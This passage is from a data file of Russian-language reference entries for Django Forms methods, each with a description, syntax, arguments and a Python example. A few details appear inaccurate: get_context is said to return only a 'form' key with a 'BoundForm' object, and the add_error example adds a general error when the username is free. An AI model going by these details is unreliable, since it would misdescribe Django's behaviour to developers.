            raise forms.ValidationError("Пароли не совпадают.")

        return data

form = PasswordChangeForm(data={'password1': 'abc123', 'password2': 'xyz456'})
print(form.is_valid())         # False
print(form.errors['__all__'])  # ['Пароли не совпадают.']`,
  },
  {
    name: "Form.add_error(field, error)",
    category: "Forms",
    description:
      'Добавляет ошибку к указанному полю формы программно — после или вместо стандартной валидации. Если field равен None — ошибка добавляется к "__all__" (ошибки формы в целом). Автоматически удаляет поле из cleaned_data при добавлении ошибки.',
    syntax: "form.add_error(field, error)",
    arguments: [
      {
        name: "field",
        description:
          "Имя поля, к которому добавляется ошибка. None — для ошибки уровня формы.",
      },
      {
        name: "error",
        description:
          "Строка с сообщением, экземпляр ValidationError или список ошибок.",
      },
    ],
    example: `from django import forms
from django.core.exceptions import ValidationError

class RegistrationForm(forms.Form):
    username = forms.CharField()
    email = forms.EmailField()

def register_view(request):
    form = RegistrationForm(request.POST)
    if form.is_valid():
        username = form.cleaned_data['username']
        # Проверка уникальности через БД
        if User.objects.filter(username=username).exists():
            form.add_error('username', 'Это имя уже занято.')
        else:
            form.add_error(None, ValidationError('Общая ошибка формы.'))
    return render(request, 'register.html', {'form': form})`,
  },
  {
    name: "Form.has_error(field, code=None)",
    category: "Forms",
    description:
      "Возвращает True, если указанное поле содержит ошибку. Если передан code — проверяет наличие ошибки с конкретным кодом. Для проверки ошибок уровня формы используйте NON_FIELD_ERRORS вместо имени поля.",
    syntax: "form.has_error(field, code=None)",
    arguments: [
      {
        name: "field",
        description:
          "Имя поля для проверки. Используйте forms.NON_FIELD_ERRORS для ошибок всей формы.",
      },
      {
        name: "code",
        description:
          'Код ошибки (например, "required", "invalid") для проверки конкретного типа ошибки.',
      },
    ],
    example: `from django import forms

class LoginForm(forms.Form):
    username = forms.CharField()
    password = forms.CharField(widget=forms.PasswordInput)

form = LoginForm(data={'username': '', 'password': ''})
form.is_valid()

# Проверка наличия ошибки в поле
print(form.has_error('username'))           # True
print(form.has_error('username', 'required'))  # True
print(form.has_error('username', 'invalid'))   # False

# Проверка ошибок всей формы
print(form.has_error(forms.NON_FIELD_ERRORS))  # False`,
  },
  {
    name: "Form.get_context()",
    category: "Forms",
    description:
      'Возвращает словарь контекста для рендеринга формы шаблонизатором. Включает ключ "form" с объектом BoundForm, содержащим поля и их состояние. Вызывается автоматически методами render() и as_*(), но может быть переопределён для передачи дополнительных данных в шаблон формы.',
    syntax: "form.get_context()",
    arguments: [],
    example: `from django import forms

class FeedbackForm(forms.Form):
    rating = forms.IntegerField(min_value=1, max_value=5)
    comment = forms.CharField(widget=forms.Textarea)

form = FeedbackForm(initial={'rating': 5})

# Получаем контекст для рендеринга
ctx = form.get_context()
print(ctx.keys())  # dict_keys(['form'])

# Используется шаблонизатором при render()
html = form.render()  # вызывает get_context() внутри`,
  },
  {
    name: "Form.render(template_name=None)",
    category: "Forms",
    description:
      "Рендерит форму в HTML-строку с использованием указанного шаблона. Если template_name не задан — используется шаблон по умолчанию из атрибута Form.template_name. Вызывает get_context() для получения данных шаблона. Возвращает SafeString — готовую HTML-разметку.",
    syntax: "form.render(template_name=None)",
    arguments: [
      {
        name: "template_name",
        description:
          "Путь к шаблону для рендеринга. Если None — используется Form.template_name.",
      },
    ],
    example: `from django import forms

class CommentForm(forms.Form):
    author = forms.CharField(label="Автор")
    text = forms.CharField(widget=forms.Textarea, label="Текст")

form = CommentForm()

# Рендеринг с шаблоном по умолчанию
html = form.render()

# Рендеринг с кастомным шаблоном
html = form.render(template_name='forms/custom_form.html')

# В шаблоне Django — эквивалентно {{ form }}
# {% autoescape off %}{{ form.render }}{% endautoescape %}`,
  },
  {
    name: "Form.as_table()",
    category: "Forms",
    description:
      "Рендерит форму в виде HTML-таблицы: каждое поле — отдельная строка <tr> с ячейками <th> для метки и <td> для виджета. Не включает теги <table> и </table> — их нужно добавить вручную. Ошибки отображаются перед соответствующей строкой.",
    syntax: "form.as_table()",
    arguments: [],
    example: `from django import forms

class ProfileForm(forms.Form):
    first_name = forms.CharField(label="Имя")
    last_name = forms.CharField(label="Фамилия")
    age = forms.IntegerField(label="Возраст")

form = ProfileForm(initial={'age': 25})
print(form.as_table())
# <tr><th><label for="id_first_name">Имя:</label></th>
#     <td><input type="text" name="first_name" id="id_first_name"></td></tr>
# ...

# В шаблоне:
# <table>{{ form.as_table }}</table>`,
  },
  {
    name: "Form.as_ul()",
    category: "Forms",
    description:
      "Рендерит форму в виде HTML-списка: каждое поле — элемент <li> с меткой и виджетом. Не включает теги <ul> и </ul> — их нужно добавить вручную. Более семантически гибкий вариант по сравнению с as_table().",
    syntax: "form.as_ul()",
    arguments: [],
    example: `from django import forms

class SignupForm(forms.Form):
    username = forms.CharField(label="Имя пользователя")
    email = forms.EmailField(label="Email")
    password = forms.CharField(widget=forms.PasswordInput, label="Пароль")

form = SignupForm()
print(form.as_ul())
# <li><label for="id_username">Имя пользователя:</label>
#     <input type="text" name="username" id="id_username"></li>
# ...

# В шаблоне:
# <ul>{{ form.as_ul }}</ul>`,
  },
  {
    name: "Form.as_p()",
    category: "Forms",
    description:
      "Рендерит форму в виде HTML-параграфов: каждое поле оборачивается в тег <p> вместе с меткой. Наиболее простой и распространённый способ быстрого отображения формы. Ошибки валидации выводятся отдельным параграфом перед соответствующим полем.",
    syntax: "form.as_p()",
    arguments: [],
    example: `from django import forms

class FeedbackForm(forms.Form):
    name = forms.CharField(label="Ваше имя")
    rating = forms.IntegerField(label="Оценка", min_value=1, max_value=5)
    comment = forms.CharField(widget=forms.Textarea, label="Комментарий")

form = FeedbackForm()
print(form.as_p())
# <p>
#   <label for="id_name">Ваше имя:</label>
#   <input type="text" name="name" id="id_name">
# </p>
# ...

# В шаблоне — самый удобный вариант для быстрого прототипа:
# <form method="post">{% csrf_token %}{{ form.as_p }}<button>Отправить</button></form>`,
  },
  {
    name: "Form.as_div()",
    category: "Forms",
    description:
      "Рендерит форму в виде блоков <div>: каждое поле оборачивается в <div> с меткой и виджетом. Является методом рендеринга по умолчанию начиная с Django 4.1 и соответствует современным стандартам HTML без использования устаревшей табличной разметки.",
    syntax: "form.as_div()",
    arguments: [],
    example: `from django import forms

class SubscribeForm(forms.Form):
    email = forms.EmailField(label="Email адрес")
    agree = forms.BooleanField(label="Согласен с условиями")

form = SubscribeForm()
print(form.as_div())
# <div>
#   <label for="id_email">Email адрес:</label>
#   <input type="email" name="email" id="id_email" required>
# </div>
# <div>
#   <label for="id_agree">Согласен с условиями:</label>
#   <input type="checkbox" name="agree" id="id_agree" required>
# </div>

# Эквивалентно {{ form }} в шаблоне (начиная с Django 4.1)`,
  },
  {
    name: "Form.hidden_fields()",
    category: "Forms",
    description:
      "Возвращает список объектов BoundField для всех скрытых полей формы (тех, чей виджет является подклассом HiddenInput). Используется в шаблонах для явного управления отображением скрытых полей, например при кастомной разметке формы.",
    syntax: "form.hidden_fields()",
    arguments: [],
    example: `from django import forms

class CheckoutForm(forms.Form):
    product_id = forms.IntegerField(widget=forms.HiddenInput)
    quantity = forms.IntegerField(label="Количество")
    address = forms.CharField(label="Адрес доставки")

form = CheckoutForm(initial={'product_id': 42})

hidden = form.hidden_fields()
print(len(hidden))           # 1
print(hidden[0].name)        # 'product_id'
print(hidden[0].as_widget())
# <input type="hidden" name="product_id" value="42" id="id_product_id">

# В шаблоне для кастомной разметки:
# {% for field in form.hidden_fields %}{{ field }}{% endfor %}`,
  },
  {
    name: "Form.visible_fields()",
    category: "Forms",
    description:
      "Возвращает список объектов BoundField для всех видимых полей формы — то есть всех полей, кроме скрытых (HiddenInput). Используется в шаблонах для итерации только по отображаемым полям при кастомной разметке формы.",
    syntax: "form.visible_fields()",
    arguments: [],
    example: `from django import forms

class ProfileForm(forms.Form):
    user_id = forms.IntegerField(widget=forms.HiddenInput)
    first_name = forms.CharField(label="Имя")
    last_name = forms.CharField(label="Фамилия")
    bio = forms.CharField(widget=forms.Textarea, label="О себе")

form = ProfileForm()

visible = form.visible_fields()
print(len(visible))  # 3  (user_id скрыт, не входит)

# Кастомный рендеринг в шаблоне:
# {% for field in form.visible_fields %}
#   <div class="field {% if field.errors %}error{% endif %}">
#     {{ field.label_tag }} {{ field }} {{ field.errors }}
#   </div>
# {% endfor %}`,
  },
  {
    name: "Form.non_field_errors()",
    category: "Forms",
    description:
      "Возвращает объект ErrorList с ошибками, не привязанными к конкретному полю — то есть ошибками уровня формы, добавленными через Form.clean() или Form.add_error(None, ...). Используется в шаблонах для явного отображения общих ошибок формы.",
    syntax: "form.non_field_errors()",
    arguments: [],
    example: `from django import forms

class TransferForm(forms.Form):
    from_account = forms.IntegerField(label="Со счёта")
    to_account = forms.IntegerField(label="На счёт")
    amount = forms.DecimalField(label="Сумма")

    def clean(self):
        data = super().clean()
        if data.get('from_account') == data.get('to_account'):
            raise forms.ValidationError(
                "Нельзя перевести деньги на тот же счёт."
            )
        return data

form = TransferForm(data={'from_account': '1', 'to_account': '1', 'amount': '100'})
form.is_valid()

errors = form.non_field_errors()
print(errors)  # ['Нельзя перевести деньги на тот же счёт.']

# В шаблоне:
# {{ form.non_field_errors }}`,
  },
  {
    name: "Form.bound_field_class",
    category: "Forms",
    description:
      "Атрибут класса, определяющий класс объекта BoundField, используемого для представления полей формы при итерации и доступе через form[name]. По умолчанию — django.forms.BoundField. Переопределяется в подклассе для добавления кастомной логики к полям формы.",
    syntax: "class MyForm(forms.Form):\n    bound_field_class = MyBoundField",
    arguments: [],
    example: `from django import forms
from django.forms import BoundField

class BootstrapBoundField(BoundField):
    """BoundField с автоматическим добавлением CSS-класса Bootstrap."""
    def css_classes(self, extra_classes=None):
        classes = super().css_classes(extra_classes)
        return f"form-group {classes}".strip()

    def as_widget(self, widget=None, attrs=None, only_initial=False):
        attrs = attrs or {}
        attrs['class'] = 'form-control'
        return super().as_widget(widget, attrs, only_initial)

class BootstrapForm(forms.Form):
    bound_field_class = BootstrapBoundField

    name = forms.CharField(label="Имя")
    email = forms.EmailField(label="Email")

form = BootstrapForm()
print(type(form['name']))  # <class 'BootstrapBoundField'>`,
  },
  {
    name: "Form.template_name",
    category: "Forms",
    description:
      'Атрибут класса, задающий путь к шаблону по умолчанию, используемому методом render() и оператором {{ form }} в шаблонах Django. Начиная с Django 4.1 значение по умолчанию — "django/forms/div.html" (рендеринг через <div>). Переопределяется для использования кастомного шаблона.',
    syntax:
      'class MyForm(forms.Form):\n    template_name = "myapp/custom_form.html"',
    arguments: [],
    example: `from django import forms

# Использование встроенного шаблона на основе <p>
class LegacyForm(forms.Form):
    template_name = 'django/forms/p.html'
    name = forms.CharField()

# Полностью кастомный шаблон
class StyledForm(forms.Form):
    template_name = 'myapp/forms/styled_form.html'
    name = forms.CharField(label="Имя")
    email = forms.EmailField(label="Email")

# В шаблоне myapp/forms/styled_form.html:
# {% for field in form %}
#   <div class="mb-3">
#     {{ field.label_tag }}
#     {{ field }}
#     {% if field.errors %}<div class="error">{{ field.errors }}</div>{% endif %}
#   </div>
# {% endfor %}

form = StyledForm()
html = form.render()  # использует template_name`,
  },
];
